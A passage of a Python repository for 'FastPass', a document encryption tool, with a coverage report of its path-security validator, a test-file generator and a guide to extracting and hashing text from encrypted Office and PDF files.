    <p class="pln"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">        <span class="com"># Check for dangerous characters (but allow colon for drive letters already handled above)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t144" href="#t144">144</a></span><span class="t">        <span class="nam">dangerous_chars</span> <span class="op">=</span> <span class="str">'&lt;>"|?*'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t145" href="#t145">145</a></span><span class="t">        <span class="key">if</span> <span class="nam">any</span><span class="op">(</span><span class="nam">char</span> <span class="key">in</span> <span class="nam">component</span> <span class="key">for</span> <span class="nam">char</span> <span class="key">in</span> <span class="nam">dangerous_chars</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t146" href="#t146">146</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t147" href="#t147">147</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t148" href="#t148">148</a></span><span class="t">        <span class="com"># Check for control characters</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t149" href="#t149">149</a></span><span class="t">        <span class="key">if</span> <span class="nam">any</span><span class="op">(</span><span class="nam">ord</span><span class="op">(</span><span class="nam">char</span><span class="op">)</span> <span class="op">&lt;</span> <span class="num">32</span> <span class="key">for</span> <span class="nam">char</span> <span class="key">in</span> <span class="nam">component</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t150" href="#t150">150</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t151" href="#t151">151</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t152" href="#t152">152</a></span><span class="t">        <span class="com"># Check for leading/trailing spaces or dots (Windows issues)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t153" href="#t153">153</a></span><span class="t">        <span class="key">if</span> <span class="nam">component</span> <span class="op">!=</span> <span class="nam">component</span><span class="op">.</span><span class="nam">strip</span><span class="op">(</span><span class="str">' .'</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t154" href="#t154">154</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t155" href="#t155">155</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t156" href="#t156">156</a></span><span class="t">        <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t157" href="#t157">157</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t158" href="#t158">158</a></span><span class="t">    <span class="key">def</span> <span class="nam">_is_file_in_safe_zone</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">resolved_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t159" href="#t159">159</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t160" href="#t160">160</a></span><span class="t"><span class="str">        B2e_Check: File in Safe Area?</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t161" href="#t161">161</a></span><span class="t"><span class="str">        Final security zone verification</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t162" href="#t162">162</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t163" href="#t163">163</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t164" href="#t164">164</a></span><span class="t">        <span class="com"># Additional checks for symbolic links</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t165" href="#t165">165</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t166" href="#t166">166</a></span><span class="t">            <span class="key">if</span> <span class="nam">resolved_path</span><span class="op">.</span><span class="nam">is_symlink</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t167" href="#t167">167</a></span><span class="t">                <span class="com"># Check if symlink target is also in safe zone</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t168" href="#t168">168</a></span><span class="t">                <span class="nam">target</span> <span class="op">=</span> <span class="nam">resolved_path</span><span class="op">.</span><span class="nam">readlink</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t169" href="#t169">169</a></span><span class="t">                <span class="key">if</span> <span class="nam">target</span><span class="op">.</span><span class="nam">is_absolute</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t170" href="#t170">170</a></span><span class="t">                    <span class="key">return</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_path_within_allowed_directories</span><span class="op">(</span><span class="nam">target</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t171" href="#t171">171</a></span><span class="t">                <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t172" href="#t172">172</a></span><span class="t">                    <span class="com"># Relative symlink - resolve relative to symlink location</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t173" href="#t173">173</a></span><span class="t">                    <span class="nam">target_resolved</span> <span class="op">=</span> <span class="op">(</span><span class="nam">resolved_path</span><span class="op">.</span><span class="nam">parent</span> <span class="op">/</span> <span class="nam">target</span><span class="op">)</span><span class="op">.</span><span class="nam">resolve</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t174" href="#t174">174</a></span><span class="t">                    <span class="key">return</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_path_within_allowed_directories</span><span class="op">(</span><span class="nam">target_resolved</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t175" href="#t175">175</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t176" href="#t176">176</a></span><span class="t">            <span class="com"># If we can't validate symlink, reject it</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t177" href="#t177">177</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t178" href="#t178">178</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t179" href="#t179">179</a></span><span class="t">        <span class="com"># Check file permissions for additional security</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t180" href="#t180">180</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t181" href="#t181">181</a></span><span class="t">            <span class="nam">file_stat</span> <span class="op">=</span> <span class="nam">resolved_path</span><span class="op">.</span><span class="nam">stat</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t182" href="#t182">182</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t183" href="#t183">183</a></span><span class="t">            <span class="com"># On Unix-like systems, check for world-writable files</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t184" href="#t184">184</a></span><span class="t">            <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">stat</span><span class="op">,</span> <span class="str">'S_IWOTH'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">file_stat</span><span class="op">.</span><span class="nam">st_mode</span> <span class="op">&amp;</span> <span class="nam">stat</span><span class="op">.</span><span class="nam">S_IWOTH</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t185" href="#t185">185</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">World-writable file detected: </span><span class="op">{</span><span class="nam">resolved_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t186" href="#t186">186</a></span><span class="t">                <span class="com"># Continue but log warning</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t187" href="#t187">187</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t188" href="#t188">188</a></span><span class="t">            <span class="com"># If we can't check permissions, continue</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t189" href="#t189">189</a></span><span class="t">            <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t190" href="#t190">190</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t191" href="#t191">191</a></span><span class="t">        <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t192" href="#t192">192</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t193" href="#t193">193</a></span><span class="t">    <span class="key">def</span> <span class="nam">validate_output_directory</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">output_dir</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Path</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t194" href="#t194">194</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t195" href="#t195">195</a></span><span class="t"><span class="str">        Additional validation for output directories</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t196" href="#t196">196</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t197" href="#t197">197</a></span><span class="t">        <span class="key">if</span> <span class="nam">output_dir</span> <span class="key">is</span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t198" href="#t198">198</a></span><span class="t">            <span class="key">return</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t199" href="#t199">199</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t200" href="#t200">200</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t201" href="#t201">201</a></span><span class="t">            <span class="nam">resolved_output</span> <span class="op">=</span> <span class="nam">output_dir</span><span class="op">.</span><span class="nam">resolve</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t202" href="#t202">202</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t203" href="#t203">203</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cannot resolve output directory: </span><span class="op">{</span><span class="nam">output_dir</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t204" href="#t204">204</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t205" href="#t205">205</a></span><span class="t">        <span class="com"># Check if output directory is within allowed boundaries</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t206" href="#t206">206</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_path_within_allowed_directories</span><span class="op">(</span><span class="nam">resolved_output</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t207" href="#t207">207</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t208" href="#t208">208</a></span><span class="t">                <span class="fst">f"</span><span class="fst">Output directory outside security boundaries: </span><span class="op">{</span><span class="nam">output_dir</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t209" href="#t209">209</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t210" href="#t210">210</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t211" href="#t211">211</a></span><span class="t">        <span class="com"># Create directory if it doesn't exist</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t212" href="#t212">212</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t213" href="#t213">213</a></span><span class="t">            <span class="nam">resolved_output</span><span class="op">.</span><span class="nam">mkdir</span><span class="op">(</span><span class="nam">parents</span><span class="op">=</span><span class="key">True</span><span class="op">,</span> <span class="nam">exist_ok</span><span class="op">=</span><span class="key">True</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t214" href="#t214">214</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t215" href="#t215">215</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cannot create output directory: </span><span class="op">{</span><span class="nam">output_dir</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t216" href="#t216">216</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t217" href="#t217">217</a></span><span class="t">        <span class="key">return</span> <span class="nam">resolved_output</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_9d0a8317fb892e58_password_manager_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_6156a86a215061be___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path=".gitignore">
# Byte-compiled / optimized / DLL files
__pycache__/
*.py[cod]
*$py.class

# C extensions
*.so

# Distribution / packaging
.Python
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
wheels/
*.egg-info/
.installed.cfg
*.egg
MANIFEST

# PyInstaller
*.manifest
*.spec

# Installer logs
pip-log.txt
pip-delete-this-directory.txt

# Unit test / coverage reports
htmlcov/
.tox/
.nox/
.coverage
.coverage.*
.cache
nosetests.xml
coverage.xml
*.cover
.hypothesis/
.pytest_cache/

# Translations
*.mo
*.pot

# Django stuff:
*.log
local_settings.py
db.sqlite3

# Flask stuff:
instance/
.webassets-cache

# Scrapy stuff:
.scrapy

# Sphinx documentation
docs/_build/

# PyBuilder
target/

# Jupyter Notebook
.ipynb_checkpoints

# IPython
profile_default/
ipython_config.py

# pyenv
.python-version

# celery beat schedule file
celerybeat-schedule

# SageMath parsed files
*.sage.py

# Environments
.env
.venv
env/
venv/
ENV/
env.bak/
venv.bak/

# Spyder project settings
.spyderproject
.spyproject

# Rope project settings
.ropeproject

# mkdocs documentation
/site

# mypy
.mypy_cache/
.dmypy.json
dmypy.json

# Pyre type checker
.pyre/

# IDE
.vscode/
.idea/
*.swp
*.swo

# OS
.DS_Store
Thumbs.db

# Project specific
data/
config/local_config.json
</file>

<file path="dev/adhoc/create_test_files.py">
#!/usr/bin/env python3
"""
Create test DOCX files for FastPass testing
"""

from docx import Document
import msoffcrypto
import io
from pathlib import Path

def create_unencrypted_file():
    """Create file1_unencrypted.docx with sample content"""
    doc = Document()
    
    # Add title
    title = doc.add_heading('Sample Business Document', 0)
    
    # Add paragraphs
    doc.add_heading('Executive Summary', level=1)
    doc.add_paragraph(
        'This is a sample business document created for testing the FastPass '
        'encryption tool. The document contains various formatting elements '
        'and content to demonstrate the tool\'s capabilities.'
    )
    
    doc.add_heading('Project Details', level=1)
    doc.add_paragraph(
        'Project Name: FastPass Testing Initiative\n'
        'Start Date: January 2024\n'
        'Status: Active\n'
        'Priority: High'
    )
    
    # Add a table
    table = doc.add_table(rows=1, cols=3)
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Task'
    hdr_cells[1].text = 'Owner'
    hdr_cells[2].text = 'Status'
    
    # Add data rows
    row_cells = table.add_row().cells
    row_cells[0].text = 'File Encryption Testing'
    row_cells[1].text = 'Security Team'
    row_cells[2].text = 'In Progress'
    
    row_cells = table.add_row().cells
    row_cells[0].text = 'Documentation Review'
    row_cells[1].text = 'Tech Writers'
    row_cells[2].text = 'Complete'
    
    # Add bullet points
    doc.add_heading('Key Features', level=1)
    doc.add_paragraph('Universal file encryption support', style='List Bullet')
    doc.add_paragraph('Password-based protection', style='List Bullet')
    doc.add_paragraph('Multiple file format compatibility', style='List Bullet')
    doc.add_paragraph('Secure temporary file handling', style='List Bullet')
    
    # Save the document
    output_path = Path(__file__).parent / 'file1_unencrypted.docx'
    doc.save(str(output_path))
    print(f"Created: {output_path}")
    return output_path

def create_encrypted_file():
    """Create file2_encrypted.docx with different content and password protection"""
    doc = Document()
    
    # Add title
    title = doc.add_heading('Confidential Security Report', 0)
    
    # Add content
    doc.add_heading('Security Assessment Results', level=1)
    doc.add_paragraph(
        'CONFIDENTIAL: This document contains sensitive security information '
        'and should be protected at all times. Access is restricted to '
        'authorized personnel only.'
    )
    
    doc.add_heading('Risk Analysis', level=1)
    doc.add_paragraph(
        'The following risks have been identified:\n'
        '• High: Unauthorized access to encrypted files\n'
        '• Medium: Password sharing between users\n'
        '• Low: Temporary file exposure during processing'
    )
    
    doc.add_heading('Recommendations', level=1)
    doc.add_paragraph(
        '1. Implement strong password policies\n'
        '2. Regular security audits\n'
        '3. Employee training on data protection\n'
        '4. Automated encryption for sensitive documents'
    )
    
    doc.add_paragraph(
        'This report was generated as part of the FastPass security testing '
        'initiative to validate encryption and decryption capabilities.'
    )
    
    # Save to memory first
    temp_output = io.BytesIO()
    doc.save(temp_output)
    temp_output.seek(0)
    
    # Encrypt the document
    encrypted_output = io.BytesIO()
    
    office_file = msoffcrypto.OfficeFile(temp_output)
    office_file.encrypt("testpassword", encrypted_output)
    
    # Save encrypted file
    output_path = Path(__file__).parent / 'file2_encrypted.docx'
    with open(output_path, 'wb') as f:
        f.write(encrypted_output.getvalue())
    
    print(f"Created encrypted file: {output_path}")
    print("Password: testpassword")
    return output_path

if __name__ == "__main__":
    print("Creating test DOCX files...")
    file1 = create_unencrypted_file()
    file2 = create_encrypted_file()
    print(f"\nFiles created:")
    print(f"  Unencrypted: {file1}")
    print(f"  Encrypted: {file2} (password: testpassword)")
</file>

<file path="dev/document_validation_comprehensive_guide.md">
# Comprehensive Document Validation Guide

## Table of Contents
1. [Overview](#overview)
2. [Core Principles](#core-principles)
3. [Testing Results](#testing-results)
4. [Validation Methods by File Type](#validation-methods-by-file-type)
5. [Implementation Architecture](#implementation-architecture)
6. [Dependencies and Installation](#dependencies-and-installation)
7. [Complete Code Examples](#complete-code-examples)
8. [Error Handling Strategies](#error-handling-strategies)
9. [Performance Considerations](#performance-considerations)
10. [Security Considerations](#security-considerations)
11. [Limitations and Edge Cases](#limitations-and-edge-cases)
12. [Future Recommendations](#future-recommendations)

## Overview

This document provides a comprehensive guide for validating document content across multiple file formats, with support for both encrypted and unencrypted versions. The validation approach focuses on extracting readable text content and comparing it using cryptographic hashing, effectively ignoring formatting differences, metadata variations, and encryption artifacts.

### Problem Statement
Traditional byte-level or XML-level document comparison fails when:
- Documents are encrypted vs unencrypted
- Files have minor formatting differences
- Metadata timestamps differ
- Documents were created with different software versions
- Binary structures vary despite identical content

### Solution Approach
**Text-based content validation** extracts only the readable content that users actually see, then compares SHA256 hashes for perfect accuracy while ignoring irrelevant structural differences.

## Core Principles

### 1. Text-Only Extraction
Extract exclusively the text content that users read:
- Document text and paragraphs
- Table cell contents
- Header and footer text
- Slide text (for presentations)
- Cell values (for spreadsheets)

### 2. Content Normalization
Standardize extracted text for consistent comparison:
- Strip leading/trailing whitespace
- Normalize line endings (`\r\n` → `\n`)
- Remove empty lines
- Preserve tab-separated formatting for structured data

### 3. Cryptographic Hashing
Use SHA256 hashing for:
- Fast comparison (hash equality = content equality)
- Deterministic results
- Integrity verification
- Batch processing capability

### 4. Encryption Transparency
Handle encryption seamlessly:
- Decrypt files in-memory when possible
- Use temporary files only when necessary
- Clean up temporary files automatically
- Support password-protected documents

## Testing Results

### DOCX Format Testing
**Files Tested:**
- `test1_docx.docx` (unencrypted baseline)
- `test1_enc1.docx` (claimed encrypted, actually unencrypted)
- `test1_enc2.docx` (password-protected with "password")

**Results:**
- ✅ `test1_docx == test1_enc1`: **TRUE** (identical content)
- ❌ `test1_docx == test1_enc2`: **FALSE** (single character difference)

**Key Finding:** Date field difference "March 15, 2024" vs "March 15, 2025"

**Validation Method:** `python-docx` library successfully extracted text from all three files, handling encryption transparently.

### DOC Format Testing
**Files Tested:**
- `test2_doc.doc` (unencrypted baseline)
- `test2_enc1.doc` (password-protected)
- `test2_enc2.doc` (password-protected)

**Results:**
- ✅ `test2_doc == test2_enc1`: **TRUE** (identical content)
- ❌ `test2_doc == test2_enc2`: **FALSE** (single character difference)

**Key Finding:** Company name difference "TechCorp Solutions" vs "TechCorp Solution"

**Validation Method:** `msoffcrypto` for decryption + `textract` for text extraction from binary DOC format.

### PDF Format Testing
**Files Tested:**
- `test1_docx.pdf` (unencrypted baseline)
- `test1_enc1.pdf` (password-protected)
- `test1_enc2.pdf` (password-protected)

**Results:**
- ✅ `test1_docx.pdf == test1_enc1.pdf`: **TRUE** (identical content)
- ❌ `test1_docx.pdf == test1_enc2.pdf`: **FALSE** (multiple differences)

**Key Findings:** 
- Text length: 2314 vs 2870 characters
- Word differences: "customer" vs "advanced customer"
- Phrase differences: "system" vs "management system"

**Validation Method:** `PyMuPDF` library handled encryption and text extraction effectively.

## Validation Methods by File Type

### DOCX Files (Microsoft Word XML Format)

#### Technical Details
- **Format:** ZIP archive containing XML files
- **Standard:** Office Open XML (OOXML)
- **Encryption:** RC4 or AES via msoffcrypto

#### Validation Process
```python
def extract_text_docx(file_path):
    # 1. Decrypt if encrypted
    decrypted_stream, was_encrypted = decrypt_office_file(file_path)
    
    # 2. Parse XML structure
    document = Document(decrypted_stream)
    
    # 3. Extract text from all components
    all_text = []
    
    # Main document paragraphs
    for paragraph in document.paragraphs:
        all_text.append(paragraph.text)
    
    # Table cells
    for table in document.tables:
        for row in table.rows:
            for cell in row.cells:
                for paragraph in cell.paragraphs:
                    all_text.append(paragraph.text)
    
    # Headers and footers
    for section in document.sections:
        if section.header:
            for paragraph in section.header.paragraphs:
                all_text.append(paragraph.text)
        if section.footer:
            for paragraph in section.footer.paragraphs:
                all_text.append(paragraph.text)
    
    return '\n'.join(text.strip() for text in all_text if text.strip())
```

#### Dependencies
- **Primary:** `python-docx` - Native OOXML parser
- **Encryption:** `msoffcrypto-tool` - Office document decryption

#### Advantages
- ✅ Reliable XML parsing
- ✅ Handles all text elements (paragraphs, tables, headers, footers)
- ✅ Fast processing
- ✅ Active maintenance

#### Limitations
- ❌ Text-only (no images, charts, embedded objects)
- ❌ Formatting information lost
- ❌ Comments and track changes ignored

### DOCM Files (Microsoft Word Macro-Enabled)

#### Technical Details
- **Format:** Same as DOCX + macro storage
- **Macros:** Stored in separate XML streams
- **Text Content:** Identical structure to DOCX

#### Validation Process
```python
# DOCM uses identical process to DOCX
# python-docx handles both formats transparently
def extract_text_docm(file_path):
    return extract_text_docx(file_path)  # Same implementation
```

#### Key Points
- ✅ `python-docx` handles DOCM files natively
- ✅ Macro code is ignored (text-only extraction)
- ✅ Same reliability as DOCX validation

### DOC Files (Microsoft Word Legacy Binary)

#### Technical Details
- **Format:** Proprietary binary format (Compound Document)
- **Complexity:** Multiple format versions (Word 6.0, 95, 97, 2000, XP, 2003)
- **Structure:** OLE (Object Linking and Embedding) compound document

#### Validation Process with Fallback Chain
```python
def extract_text_doc(file_path):
    # Method 1: textract (most reliable)
    try:
        import textract
        text = textract.process(file_path).decode('utf-8')
        return text.strip()
    except Exception:
        pass
    
    # Method 2: docx2txt (lighter alternative)
    try:
        import docx2txt
        text = docx2txt.process(file_path)
        return text.strip() if text else ""
    except Exception:
        pass
    
    # Method 3: antiword (system utility)
    try:
        import subprocess
        result = subprocess.run(['antiword', file_path], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception:
        pass
    
    # Method 4: olefile (direct OLE parsing)
    try:
        import olefile
        if olefile.isOleFile(file_path):
            ole = olefile.OleFileIO(file_path)
            # Custom parsing implementation...
    except Exception:
        pass
    
    return "ERROR: Could not extract text from DOC file"
```

#### Why Multiple Fallback Methods?
1. **textract:** Most comprehensive, handles various DOC versions
2. **docx2txt:** Faster, lighter weight for simple documents
3. **antiword:** System utility, excellent for older DOC formats
4. **olefile:** Direct binary parsing, last resort for corrupted files

#### Dependencies
- **Primary:** `textract` - Multi-format document processor
- **Fallback:** `docx2txt` - Lightweight DOC processor
- **System:** `antiword` - Command-line DOC converter
- **Binary:** `olefile` - OLE compound document parser
- **Encryption:** `msoffcrypto-tool`

#### Advantages
- ✅ Multiple extraction methods ensure compatibility
- ✅ Handles corrupted or unusual DOC files
- ✅ Works with very old Word formats

#### Limitations
- ❌ Slower than XML formats
- ❌ More error-prone due to binary complexity
- ❌ Requires multiple dependencies for reliability

### XLSX Files (Microsoft Excel XML Format)

#### Technical Details
- **Format:** ZIP archive with XML worksheets
- **Standard:** Office Open XML Spreadsheet
- **Structure:** Multiple worksheets, shared strings, styles

#### Validation Process
```python
def extract_text_xlsx(file_path):
    import openpyxl
    
    # Load workbook with calculated values (not formulas)
    workbook = openpyxl.load_workbook(file_path, data_only=True)
    all_text = []
    
    for sheet_name in workbook.sheetnames:
        sheet = workbook[sheet_name]
        all_text.append(f"SHEET: {sheet_name}")
        
        for row in sheet.iter_rows():
            row_text = []
            for cell in row:
                if cell.value is not None:
                    row_text.append(str(cell.value))
            if row_text:
                all_text.append('\t'.join(row_text))
    
    workbook.close()
    return '\n'.join(all_text)
```

#### Key Configuration
- **`data_only=True`:** Returns calculated values instead of formulas
- **Tab separation:** Preserves column structure
- **Sheet headers:** Clear worksheet boundaries

#### Dependencies
- **Primary:** `openpyxl` - Native XLSX reader/writer
- **Encryption:** `msoffcrypto-tool`

#### Advantages
- ✅ Gets calculated values, not formulas
- ✅ Handles multiple worksheets
- ✅ Preserves table structure with tabs
- ✅ Fast XML processing

#### Limitations
- ❌ Formulas lost (shows results only)
- ❌ Charts and images ignored
- ❌ Cell formatting information lost

### XLS Files (Microsoft Excel Legacy Binary)

#### Technical Details
- **Format:** Binary Interchange File Format (BIFF)
- **Versions:** Excel 5.0, 95, 97-2003
- **Structure:** Compound document with binary records

#### Validation Process
```python
def extract_text_xls(file_path):
    import xlrd
    
    workbook = xlrd.open_workbook(file_path)
    all_text = []
    
    for sheet_idx in range(workbook.nsheets):
        sheet = workbook.sheet_by_index(sheet_idx)
        all_text.append(f"SHEET: {sheet.name}")
        
        for row_idx in range(sheet.nrows):
            row_text = []
            for col_idx in range(sheet.ncols):
                cell = sheet.cell(row_idx, col_idx)
                if cell.value:
                    row_text.append(str(cell.value))
            if row_text:
                all_text.append('\t'.join(row_text))
    
    return '\n'.join(all_text)
```

#### Dependencies
- **Primary:** `xlrd` - Specialized binary Excel reader
- **Encryption:** `msoffcrypto-tool`

#### Advantages
- ✅ Only library that reliably handles legacy Excel formats
- ✅ Fast binary parsing
- ✅ Handles very old Excel files

#### Limitations
- ❌ Limited to Excel files created before 2007
- ❌ No formula calculation (shows stored values)
- ❌ Charts and objects ignored

### PPTX Files (Microsoft PowerPoint XML Format)

#### Technical Details
- **Format:** ZIP archive with XML slides
- **Standard:** Office Open XML Presentation
- **Structure:** Slides with shapes, tables, media

#### Validation Process
```python
def extract_text_pptx(file_path):
    from pptx import Presentation
    
